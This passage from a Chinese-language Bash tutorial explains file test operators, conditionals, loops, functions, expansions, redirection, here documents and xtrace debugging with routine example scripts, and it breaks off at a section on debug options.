<h4 data-id="heading-29">文件测试运算符</h4>
<p>这是 Shell 自动化运维中最强大的功能之一，用于检测文件属性</p>











































































<table><thead><tr><th>操作符</th><th>含义与检测对象</th><th>典型场景</th></tr></thead><tbody><tr><td><strong>-e</strong></td><td><strong>E</strong>xist。检测对象是否存在（包括文件、目录、特殊文件等）</td><td>最基础的判断，后续操作的大前提</td></tr><tr><td><strong>-f</strong></td><td><strong>F</strong>ile。检测是否为<strong>普通文件</strong>（排除目录、设备）</td><td>确保操作对象不是目录</td></tr><tr><td><strong>-d</strong></td><td><strong>D</strong>irectory。检测是否为<strong>目录</strong></td><td>创建日志目录前先判断是否存在</td></tr><tr><td><strong>-s</strong></td><td><strong>S</strong>ize。检测对象存在且<strong>大小不为 0</strong></td><td>判断下载的文件是否损坏或为空</td></tr><tr><td><strong>-r</strong></td><td><strong>R</strong>ead。检测当前用户是否可读</td><td>只有可读才能 grep 配置</td></tr><tr><td><strong>-w</strong></td><td><strong>W</strong>rite。检测当前用户是否可写</td><td>判断日志文件是否被 chattr 锁定</td></tr><tr><td><strong>-x</strong></td><td>E<strong>x</strong>ecute。检测当前用户是否可执行</td><td>判断脚本是否有 +x 权限</td></tr><tr><td>-b</td><td><strong>B</strong>lock。检测是否为<strong>块设备</strong>文件</td><td>挂载磁盘、检查 /dev/sda</td></tr><tr><td>-c</td><td><strong>C</strong>har。检测是否为<strong>字符设备</strong>文件</td><td>检查串口设备、/dev/null</td></tr><tr><td>-p</td><td><strong>P</strong>ipe。检测是否为<strong>命名管道</strong> (FIFO)</td><td>进程间通信检测</td></tr><tr><td>-u</td><td>S<strong>U</strong>ID。检测文件是否设置了 SUID 位</td><td>安全审计，如检查 /usr/bin/passwd</td></tr><tr><td>-g</td><td>S<strong>G</strong>ID。检测文件是否设置了 SGID 位</td><td>协作组目录权限检查</td></tr><tr><td>-k</td><td>Stic<strong>k</strong>y。检测目录是否设置了粘着位</td><td>检查 /tmp 目录权限（防误删）</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-comment"># 待检测的配置文件</span>
config_file=<span class="hljs-string">"/etc/hosts"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Checking config: <span class="hljs-variable">$config_file</span> ..."</span>

<span class="hljs-comment"># 第一层：先看存不存在 (-e)</span>
<span class="hljs-keyword">if</span> [[ ! -e <span class="hljs-string">"<span class="hljs-variable">$config_file</span>"</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Error: File not found!"</span>
    <span class="hljs-built_in">exit</span> 1
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># 第二层：存在的话，判断是否为普通文件</span>
<span class="hljs-keyword">if</span> [[ ! -f <span class="hljs-string">"<span class="hljs-variable">$config_file</span>"</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Error: This is a directory or device, not a file!"</span>
    <span class="hljs-built_in">exit</span> 1
<span class="hljs-keyword">fi</span>

<span class="hljs-comment"># 第三层：判断文件是否为空</span>
<span class="hljs-keyword">if</span> [[ ! -s <span class="hljs-string">"<span class="hljs-variable">$config_file</span>"</span> ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Warning: File is empty."</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-comment"># 第四层：逻辑嵌套检测权限，既要存在，又要可读，且可写</span>
    <span class="hljs-keyword">if</span> [[ -r <span class="hljs-string">"<span class="hljs-variable">$config_file</span>"</span> &amp;&amp; -w <span class="hljs-string">"<span class="hljs-variable">$config_file</span>"</span> ]]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"OK: File is healthy (Readable &amp; Writable)."</span>
    <span class="hljs-keyword">elif</span> [[ -r <span class="hljs-string">"<span class="hljs-variable">$config_file</span>"</span> ]]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Note: Read-only file."</span>
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Error: Permission denied."</span>
    <span class="hljs-keyword">fi</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<h3 data-id="heading-30">流程控制</h3>
<p>任何强大的脚本都离不开<strong>逻辑判断</strong>与<strong>循环执行</strong>。Shell 提供了类 C 语言风格的流程控制，但其语法对空格和符号极其敏感</p>
<h4 data-id="heading-31">条件语句</h4>
<p>Shell 的条件判断主要依赖 if 和 case。其中 if 的判断基元建议无脑使用现代 Bash 的<code>[[ ]]</code>（而非旧式的<code>[ ]</code>），因为它能自动处理空变量且支持正则，表达式和方括号之间必须有空格</p>
<h5 data-id="heading-32">if-else</h5>
<p>最经典的条件判断。注意 if 块结束后必须跟 fi</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-comment"># 单行极简写法（适合简单防御逻辑）</span>
[[ ! -d <span class="hljs-string">"build"</span> ]] &amp;&amp; <span class="hljs-built_in">mkdir</span> <span class="hljs-string">"build"</span>

<span class="hljs-comment"># 标准多分支写法</span>
score=85

<span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$score</span> -ge 90 ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"优秀"</span>
<span class="hljs-keyword">elif</span> [[ <span class="hljs-variable">$score</span> -ge 60 ]]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"及格"</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"不及格"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<h5 data-id="heading-33">case</h5>
<p>当你需要面对很多选项（尤其是<strong>用户交互</strong>或<strong>参数解析</strong>）时，<code>case</code>远比一堆<code>if-elif</code>优雅。它支持通配符匹配</p>
<ul>
<li><code>|</code>：分割多个模式（类似 OR）</li>
<li><code>;;</code>：结束当前块（类似 break）</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/usr/bin/env bash</span>

<span class="hljs-comment"># 场景：根据后缀处理文件</span>
file_name=<span class="hljs-string">"data.tar.gz"</span>

<span class="hljs-comment"># "${file_name##*.}" 提取的是 "gz" (见变量操作章节)</span>
<span class="hljs-keyword">case</span> <span class="hljs-string">"<span class="hljs-variable">$file_name</span>"</span> <span class="hljs-keyword">in</span>
    *.tar.gz|*.tgz) 
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Decompressing with tar..."</span> 
        <span class="hljs-comment"># tar -zxvf "$file_name"</span>
        ;;
    *.zip)
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Decompressing with unzip..."</span>
        ;;
    *)
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Unknown format!"</span>
        ;;
<span class="hljs-keyword">esac</span>
</code></pre>
<blockquote>
<p>每种情况都是匹配了某个模式的表达式。<code>|</code>用来分割多个模式，<code>)</code>用来结束一个模式序列。第一个匹配上的模式对应的命令将会被执行。<code>*</code>代表任何不匹配以上给定模式的模式。命令块儿之间要用<code>;;</code>分隔</p>
</blockquote>
<h4 data-id="heading-34">循环语句</h4>
<p>Bash 提供了 for (遍历列表), while (条件循环), until (反向循环) 和 select (交互菜单) 四种机制</p>
<h5 data-id="heading-35">for循环</h5>
<p><code>for</code>与它在 C 语言中的姊妹非常像。看起来是这样：</p>
<pre><code class="hljs language-shell" lang="shell">for arg in elem1 elem2 ... elemN
do
<span class="hljs-meta prompt_">  #</span><span class="bash"><span class="hljs-comment">## 语句2</span></span>
done
</code></pre>
<p>在每次循环的过程中，<code>arg</code>依次被赋值为从<code>elem1</code>到<code>elemN</code>。这些值还可以是通配符或者<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fdenysdovhan%2Fbash-handbook%2Fblob%2Fmaster%2Ftranslations%2Fzh-CN%2FREADME.md%23%25E5%25A4%25A7%25E6%258B%25AC%25E5%258F%25B7%25E6%2589%25A9%25E5%25B1%2595" target="_blank" title="https://github.com/denysdovhan/bash-handbook/blob/master/translations/zh-CN/README.md#%E5%A4%A7%E6%8B%AC%E5%8F%B7%E6%89%A9%E5%B1%95" ref="nofollow noopener noreferrer">大括号扩展</a>。</p>
<p>当然，我们还可以把<code>for</code>循环写在一行，但这要求<code>do</code>之前要有一个分号，就像下面这样：</p>
<pre><code class="hljs language-shell" lang="shell">for i in {1..5}; do echo $i; done
</code></pre>
<p>还有，如果你觉得<code>for..in..do</code>对你来说有点奇怪，那么你也可以像 C 语言那样使用<code>for</code>，比如：</p>
<pre><code class="hljs language-shell" lang="shell">for (( i = 0; i &lt; 10; i++ )); do
  echo $i
done
</code></pre>
<p>当我们想对一个目录下的所有文件做同样的操作时，<code>for</code>就很方便了。举个例子，如果我们想把所有的<code>.bash</code>文件移动到<code>script</code>文件夹中，并给它们可执行权限，我们的脚本可以这样写：</p>
<pre><code class="hljs language-shell" lang="shell">DIR=/home/zp
for FILE in ${DIR}/*.sh; do
  mv "$FILE" "${DIR}/scripts"
done
<span class="hljs-meta prompt_"># </span><span class="bash">将 /home/zp 目录下所有 sh 文件拷贝到 /home/zp/scripts</span>
</code></pre>
<h5 data-id="heading-36">while循环</h5>
<p>while 是构建<strong>持续运行服务</strong>或<strong>按行读取文件</strong>的神器</p>
<pre><code class="hljs language-shell" lang="shell">while [[ condition ]]
do
<span class="hljs-meta prompt_">  #</span><span class="bash"><span class="hljs-comment">## 语句</span></span>
done
</code></pre>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">基本条件循环</span>
count=0
while [[ $count -lt 3 ]]; do
    echo "Count: $count"
    ((count++)) # 现代 Bash 数学运算推荐写法，别用 expr
done
<span class="hljs-meta prompt_">
# </span><span class="bash">逐行读取文件</span>
<span class="hljs-meta prompt_"># </span><span class="bash">将 file.txt 的内容一行行读入 line 变量</span>
while read -r line; do
    echo "Processing: $line"
done &lt; "config.txt"
</code></pre>
<h5 data-id="heading-37">until循环</h5>
<p>逻辑与 while 刚好相反：<strong>直到条件成立</strong>才停止。实战中用得少，通常用于“等待某个服务启动”</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">等待 Postgres 端口 (5432) 连通</span>
until nc -z localhost 5432; do
    echo "Waiting for DB..."
    sleep 1
done
echo "DB started!"
</code></pre>
<h5 data-id="heading-38">select循环</h5>
<p><code>select</code>循环帮助我们组织一个用户菜单。它的语法几乎跟<code>for</code>循环一致：</p>
<pre><code class="hljs language-shell" lang="shell">select answer in elem1 elem2 ... elemN
do
<span class="hljs-meta prompt_">  #</span><span class="bash"><span class="hljs-comment">## 语句</span></span>
done
</code></pre>
<p>select 会打印<code>elem1..elemN</code>以及它们的序列号到屏幕上，之后会提示用户输入。通常看到的是<code>$?</code>。用户的选择结果会被保存到<code>answer</code>中。如果<code>answer</code>是一个在<code>1..N</code>之间的数字，那么语句会被执行，紧接着会进行下一次迭代，跳出循环使用<code>break</code>语句</p>
<pre><code class="hljs language-shell" lang="shell">PS3="请选择包管理器: "  # 设置提示符
select item in bower npm gem pip; do
    if [[ -n "$item" ]]; then
        echo "你选择了: $item"
        # 实际逻辑...
        break # 选完后跳出菜单
    else
        echo "输入无效，请重试。"
    fi
done
</code></pre>
<h5 data-id="heading-39">控制跳转</h5>
<p>如果想提前结束一个循环或跳过某次循环执行，可以使用 shell 的<code>break</code>和<code>continue</code>语句来实现。它们可以在任何循环中使用</p>
<ul>
<li><strong>break</strong>：直接跳出<strong>整个</strong>循环（结束遍历）</li>
<li><strong>continue</strong>：跳过<strong>本次</strong>循环剩余代码，直接进入下一次</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 寻找 10 到 20 之间的第一个能被 5 整除的数</span>
<span class="hljs-keyword">for</span> (( num=<span class="hljs-number">10</span>; num&lt;=<span class="hljs-number">20</span>; num++ )); <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">if</span> (( num % <span class="hljs-number">5</span> == <span class="hljs-number">0</span> )); <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Found divisible by 5: <span class="hljs-variable">$num</span>"</span>
        <span class="hljs-built_in">break</span>  <span class="hljs-comment"># 找到一个就退出循环</span>
    <span class="hljs-keyword">fi</span>
<span class="hljs-keyword">done</span>

<span class="hljs-comment"># 输出：Found divisible by 5: 10 (这里只是示例，实际上 10 就是)</span>
</code></pre>
<h3 data-id="heading-40">函数</h3>
<p>Shell 函数是脚本组织和复用代码的核心。定义函数有两种主流语法：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 推荐，POSIX 兼容性好</span>
<span class="hljs-function"><span class="hljs-title">func_name</span></span>() {
    <span class="hljs-comment"># 函数体</span>
    <span class="hljs-built_in">return</span> 0
}

<span class="hljs-comment"># Bash 特有，明确显示 function 关键字</span>
<span class="hljs-keyword">function</span> func_name {
    <span class="hljs-comment"># 函数体...</span>
}
</code></pre>
<blockquote>
<p>💡 说明：</p>
<ol>
<li>函数定义时，<code>function</code>关键字可有可无</li>
<li>函数返回值 - return 返回函数返回值，返回值类型只能为整数（0-255）。如果不加 return 语句，shell 默认将以最后一条命令的运行结果，作为函数返回值</li>
<li>函数返回值在调用该函数后通过<code>$?</code>来获得</li>
<li>Shell 是解释执行的，必须<strong>先定义、后调用</strong>，调用函数仅使用函数名即可<code>func_name arg1 arg2</code></li>
</ol>
</blockquote>
<h4 data-id="heading-41">作用域</h4>
<p>在 Shell 函数中定义变量，默认是<strong>全局 (Global)</strong> 的，这会修改脚本其他地方的同名变量。在函数内部，始终使用<code>local</code>关键字声明变量</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 错误示范 (污染全局)</span>
<span class="hljs-function"><span class="hljs-title">bad_func</span></span>() {
    result=<span class="hljs-string">"Hacked!"</span> <span class="hljs-comment"># 修改了外面的变量</span>
}

<span class="hljs-comment"># 正确示范 (局部隔离)</span>
<span class="hljs-function"><span class="hljs-title">good_func</span></span>() {
    <span class="hljs-built_in">local</span> result=<span class="hljs-string">"Safe"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Inside: <span class="hljs-variable">$result</span>"</span>
}
</code></pre>
<h4 data-id="heading-42">函数传参</h4>
<p>函数内部有自己的一套<strong>位置参数</strong>系统。当调用 my_func 10 20 时：</p>
<ul>
<li>函数内的<code>$1</code>是 10（而不是脚本本身的第一个参数）</li>
<li>函数内的<code>$#</code>是传递给该函数的参数个数</li>
<li>函数内的<code>$0</code>仍然是<strong>脚本文件名</strong>，而非函数名（获取函数名需用 $FUNCNAME）</li>
</ul>





























<table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td><code>$0</code></td><td>脚本名称</td></tr><tr><td><code>$1 … $9</code></td><td>函数接收的第 1 到 9 个参数</td></tr><tr><td><code>$*</code> or <code>$@</code></td><td>不包括<code>$0</code>，函数内接收的所有参数列表</td></tr><tr><td><code>$#</code></td><td>不包括<code>$0</code>，函数内接收的参数总个数</td></tr><tr><td><code>$FUNCNAME</code></td><td>函数名称（仅在函数内部有值）</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-comment"># 一个健壮的处理参数的函数模板</span>
<span class="hljs-function"><span class="hljs-title">deploy_app</span></span>() {
    <span class="hljs-built_in">local</span> app_name=<span class="hljs-variable">$1</span>
    <span class="hljs-built_in">local</span> version=<span class="hljs-variable">${2:-"latest"}</span> <span class="hljs-comment"># 支持默认值</span>

    <span class="hljs-keyword">if</span> [[ -z <span class="hljs-string">"<span class="hljs-variable">$app_name</span>"</span> ]]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"Usage: <span class="hljs-variable">$FUNCNAME</span> &lt;app_name&gt; [version]"</span>
        <span class="hljs-built_in">return</span> 1 <span class="hljs-comment"># 返回错误状态码</span>
    <span class="hljs-keyword">fi</span>

    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Deploying [ <span class="hljs-variable">$app_name</span> ] with version [ <span class="hljs-variable">$version</span> ]..."</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Args count: <span class="hljs-variable">$#</span>"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Args list: <span class="hljs-variable">$@</span>"</span>
}

<span class="hljs-comment"># 调用</span>
deploy_app <span class="hljs-string">"nginx"</span> <span class="hljs-string">"1.24"</span>
<span class="hljs-comment"># deploy_app "redis"  &lt;-- 使用默认 version</span>
</code></pre>
<h4 data-id="heading-43">函数返回值</h4>
<p>这是 Shell 函数与其他语言（Java/Python）<strong>最大的区别</strong>。函数有两个“输出通道”：</p>
<p>:one:返回状态码（return）</p>
<p>用于控制逻辑流程，范围限制<code>0~255</code>，约定0为成功，非0为失败</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-function"><span class="hljs-title">check_file</span></span>() {
    [[ -f <span class="hljs-string">"<span class="hljs-variable">$1</span>"</span> ]] &amp;&amp; <span class="hljs-built_in">return</span> 0 || <span class="hljs-built_in">return</span> 1
}

<span class="hljs-comment"># 调用逻辑</span>
<span class="hljs-keyword">if</span> check_file <span class="hljs-string">"/etc/hosts"</span>; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"File exists!"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<p>:two:返回数据结果（return）</p>
<p>用于返回计算结果、字符串或处理后的数据。将结果打印到标准输出，调用者使用<code>$()</code>赋值给变量</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 错误做法：尝试 return 字符串或大数字</span>
<span class="hljs-comment"># calc() { return 300; } -&gt; $? 会变成 44 (因为 300%256 = 44)</span>

<span class="hljs-comment"># 正确做法：echo 输出结果</span>
<span class="hljs-function"><span class="hljs-title">calc_sum</span></span>() {
    <span class="hljs-built_in">local</span> a=<span class="hljs-variable">$1</span>
    <span class="hljs-built_in">local</span> b=<span class="hljs-variable">$2</span>
    <span class="hljs-built_in">local</span> result=$(( a + b ))
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$result</span>"</span>  <span class="hljs-comment"># 打印到 stdout</span>
}

<span class="hljs-comment"># 捕获数据</span>
total=$(calc_sum 10 200) 
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Total is: <span class="hljs-variable">$total</span>"</span> <span class="hljs-comment"># Output: 210</span>
</code></pre>
<h3 data-id="heading-44">Shell进阶</h3>
<p>在 Shell 接收到我们输入的一行命令后，并不会直接丢给内核执行。在此之前，它会进行一系列精密的解析和预处理</p>
<ul>
<li>扩展（Expansions）：将符号转换具体的值（如变量替换、算术计算）</li>
<li>重定向（Redirections）：重新排布输入输出的数据流向</li>
</ul>
<h4 data-id="heading-45">Shell扩展体系</h4>
<p>扩展本质上是一种**“替换机制”**。Shell 会扫描命令行中的特殊标记（Tokens），将其替换为最终的字符串，然后才运行命令</p>
<h5 data-id="heading-46">大括号扩展</h5>
<p>大括号扩展是最先被执行的扩展。它用于生成任意字符串序列，<strong>不仅限于已存在的文件</strong></p>
<ul>
<li>字符串枚举</li>
</ul>
<pre><code class="hljs language-shell" lang="shell">echo beg{i,a,u}n
<span class="hljs-meta prompt_"># </span><span class="bash">Output: begin began begun</span>
</code></pre>
<ul>
<li>序列生成</li>
</ul>
<pre><code class="hljs language-shell" lang="shell">echo {0..5}       # 生成 0 1 2 3 4 5
echo {a..e}       # 生成 a b c d e
echo {10..20..2}  # [步长] 生成 10 12 14 16 18 20
</code></pre>
<blockquote>
<p>⚡场景实战：<code>cp config.conf{,.bak}</code> 等价于 <code>cp config.conf config.conf.bak</code></p>
</blockquote>
<h5 data-id="heading-47">命令置换</h5>
<p>允许将一个命令的<strong>标准输出</strong>结果，作为另一个命令的参数。当一个命令被 `` 或 $() 包围时，命令置换将会执行</p>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">获取当前日期并赋值</span>
current_time=$(date +%T)
<span class="hljs-meta prompt_">
# </span><span class="bash">查找 docker 的绝对路径并显示详情</span>
ls -l $(which docker)
</code></pre>
<h5 data-id="heading-48">算数扩展</h5>
<p>Bash 处理整数运算的原生方式。算数表达式必须包在<code>$(( ))</code>中，双括号内部引用变量无需加<code>$</code>前缀</p>
<pre><code class="hljs language-shell" lang="shell">x=10
y=5
<span class="hljs-meta prompt_">
# </span><span class="bash">基础运算</span>
echo $(( x + y ))     # Output: 15
<span class="hljs-meta prompt_"># </span><span class="bash">复杂运算（先算乘法）</span>
result=$(( (x + y) * 2 )) 
<span class="hljs-meta prompt_">
# </span><span class="bash">C 风格的自增（Side Effect）</span>
echo $(( ++x ))       # x 变为 11，输出 11
</code></pre>
<h4 data-id="heading-49">流与重定向</h4>
<p>在 Linux 中，一切皆文件，Shell 程序之间的协同工作，依赖于**数据流（Streams）**的传送与重组</p>
<h5 data-id="heading-50">文件描述符</h5>
<p>任何一个进程启动时，内核都会默认打开三个“文件”端口：</p>





























<table><thead><tr><th align="left">句柄 (FD)</th><th align="left">名称</th><th align="left">缩写</th><th align="left">默认指向</th></tr></thead><tbody><tr><td align="left"><strong>0</strong></td><td align="left">标准输入</td><td align="left"><code>stdin</code></td><td align="left">键盘输入</td></tr><tr><td align="left"><strong>1</strong></td><td align="left">标准输出</td><td align="left"><code>stdout</code></td><td align="left">屏幕终端</td></tr><tr><td align="left"><strong>2</strong></td><td align="left">标准错误</td><td align="left"><code>stderr</code></td><td align="left">屏幕终端</td></tr></tbody></table>
<blockquote>
<p><strong>💡为什么会有 2 个输出？</strong>
为了将“正常的业务结果”与“报错信息”分离。当我们在管道中 <code>| grep</code> 时，默认只处理 stdout，确保报错信息不会污染下游的数据处理</p>
</blockquote>
<h5 data-id="heading-51">重定向运算符</h5>








































<table><thead><tr><th align="left">运算符</th><th align="left">作用</th><th align="left">记忆技巧</th></tr></thead><tbody><tr><td align="left"><strong><code>&gt;</code></strong></td><td align="left"><strong>覆盖</strong>输出 (stdout)</td><td align="left">箭头指向文件，原有内容被清空</td></tr><tr><td align="left"><strong><code>&gt;&gt;</code></strong></td><td align="left"><strong>追加</strong>输出 (stdout)</td><td align="left">双箭头代表追加，保留原内容</td></tr><tr><td align="left"><strong><code>2&gt;</code></strong></td><td align="left">重定向<strong>错误</strong> (stderr)</td><td align="left">显式指定 FD=2 (错误流)</td></tr><tr><td align="left"><strong><code>&amp;&gt;</code></strong></td><td align="left">重定向<strong>所有</strong> (1+2)</td><td align="left"><code>&amp;</code> 代表混合</td></tr><tr><td align="left"><strong><code>&lt;</code></strong></td><td align="left">重定向<strong>输入</strong></td><td align="left">箭头反向，从文件读取内容</td></tr><tr><td align="left"><strong><code>2&gt;&amp;1</code></strong></td><td align="left">将 stderr 指向 stdout</td><td align="left">让错误流并入正常流一起处理</td></tr></tbody></table>
<ul>
<li>错误日志分离</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 正常的去 output.log，报错的去 error.log</span>
./deploy.sh &gt; output.log 2&gt; error.log
</code></pre>
<ul>
<li>全量日志合并</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 将标准错误重定向到标准输出（&amp;1），然后一起写到文件</span>
<span class="hljs-comment"># 2&gt;&amp;1 必须写在最后</span>
./app_start.sh &gt; app.log 2&gt;&amp;1
</code></pre>
<ul>
<li>黑洞模式</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 禁止一切输出（常用于静默运行定时任务）</span>
./silent_task.sh &gt; /dev/null 2&gt;&amp;1
</code></pre>
<blockquote>
<p><code>/dev/null</code>是一个特殊的文件，写入到它的内容都会被丢弃；如果尝试从该文件读取内容，那么什么也读不到</p>
</blockquote>
<h4 data-id="heading-52">Here Document</h4>
<p>Here Document（嵌入文档）是一种在 Shell 脚本中定义多行字符串输入的特殊语法，常用于自动生成配置文件或向命令投喂多行数据</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">command</span> &lt;&lt; <span class="hljs-string">MARKER
    ...Content...
MARKER</span>

<span class="hljs-comment"># MARKER：定界符，常用 EOF (End Of File)，但其实用什么词都可以</span>
<span class="hljs-comment"># 约束：结尾的定界符必须顶格写，且后面不能有空格</span>
</code></pre>
<ul>
<li>最常见的用法：动态生成一个配置文件</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 将 EOF 之间的内容写入到 config.conf 文件中</span>
<span class="hljs-built_in">cat</span> &gt; /etc/nginx/conf.d/default.conf &lt;&lt; <span class="hljs-string">EOF
server {
    listen 80;
    server_name example.com;
}
EOF</span>
</code></pre>
<ul>
<li>通过 <code>wc -l</code> 命令计算 document 的行数：</li>
</ul>
<pre><code class="hljs language-shell" lang="shell">wc -l &lt;&lt; EOF
    This is a simple lookup program
    for good (and bad) restaurants
    in Cape Town.
EOF
<span class="hljs-meta prompt_">
# </span><span class="bash">output:</span>
<span class="hljs-meta prompt_"># </span><span class="bash">3</span>
</code></pre>
<h3 data-id="heading-53">Debug</h3>
<p>与其他高级语言拥有完善的 IDE 调试器不同，Shell 脚本的调试往往依赖日志和追踪模式。Shell 提供了一组强大的内建选项，帮助我们将脚本的执行过程可视化</p>
<h4 data-id="heading-54">三种调试方式</h4>
<p>最常用的调试参数是<code>-x (xtrace)</code>，开启后，Shell 会在执行每一行命令前，将<strong>变量替换后</strong>的完整命令打印到标准错误输出中</p>
<ul>
<li>命令行临时开启（无需修改脚本内容，用于临时排查问题）</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">bash -x script.sh
</code></pre>
<ul>
<li>在头部Shebang永久开启（常用于开发阶段）</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash -x</span>
</code></pre>
<ul>
<li>在脚本内动态开启（set命令）</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">set</span> -x  <span class="hljs-comment"># 开启追踪</span>
<span class="hljs-comment"># ... 代码 ...</span>
</code></pre>
<h4 data-id="heading-55">调试输出</h4>
<p>当我们启用<code>-x</code>模式运行如下脚本：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
name=<span class="hljs-string">"Shell"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"Hello, <span class="hljs-variable">$name</span>"</span>
</code></pre>
<p>输出结果如下</p>
<pre><code class="hljs language-bash" lang="bash">+ name=Shell          &lt;-- 赋值操作
+ <span class="hljs-built_in">echo</span> <span class="hljs-string">'Hello, Shell'</span> &lt;-- 变量已被展开，<span class="hljs-variable">$name</span> 变成了 Shell
Hello, Shell          &lt;-- 真实的脚本执行结果
</code></pre>
<ul>
<li><code>+</code>：这是调试信息的默认前缀（由环境变量 $PS4 控制），每一层调用（如函数嵌套）会增加一个<code>+</code></li>
<li>变量展开：最核心的价值！可清楚看到变量<code>$name</code>在执行时变成了什么值，90% 的 Bug 都能通过这个发现</li>
</ul>
<h4 data-id="heading-56">局部调试</h4>
<p>如果脚本为几千行，全篇开启<code>-x</code>会导致屏幕被海量日志淹没。此时，我们只需要使用<code>set</code>命令包裹出可疑代码段即可</p>
<p>语法如下（有点反直觉）</p>
<ul>
<li><code>set -x</code>：开启调试（减号代表 Activate）</li>
<li><code>set +x</code>：关闭调试（加号代表 Deactivate）</li>
</ul>
<p>示例：只调试循环内部</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"Start process..."</span>

<span class="hljs-comment"># 开启局部调试：只关心循环里的变量变化</span>
<span class="hljs-built_in">set</span> -x
<span class="hljs-keyword">for</span> (( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++ )); <span class="hljs-keyword">do</span>
    <span class="hljs-comment"># 这里的信息会被打印出来，带有 '+' 前缀</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"Processing index: <span class="hljs-variable">$i</span>"</span>
<span class="hljs-keyword">done</span>
<span class="hljs-built_in">set</span> +x

<span class="hljs-built_in">echo</span> <span class="hljs-string">"End process..."</span> <span class="hljs-comment"># 这句正常执行，不会被追踪</span>
</code></pre>
<p>运行输出如下</p>
<pre><code class="hljs language-bash" lang="bash">Start process...
+ (( i = <span class="hljs-number">0</span> ))
+ (( i &lt; <span class="hljs-number">3</span> ))
+ <span class="hljs-built_in">echo</span> <span class="hljs-string">'Processing index: 0'</span>
Processing index: 0
+ (( i++ ))
+ (( i &lt; <span class="hljs-number">3</span> ))
+ <span class="hljs-built_in">echo</span> <span class="hljs-string">'Processing index: 1'</span>
Processing index: 1
...
+ <span class="hljs-built_in">set</span> +x
End process...
</code></pre>
<h4 data-id="heading-57">调试选项</h4>
<p>以下是开发中最常见的选项清单，按<strong>实用场景</strong>分类</p>
<p>🔧 核心调试与排错</p>



































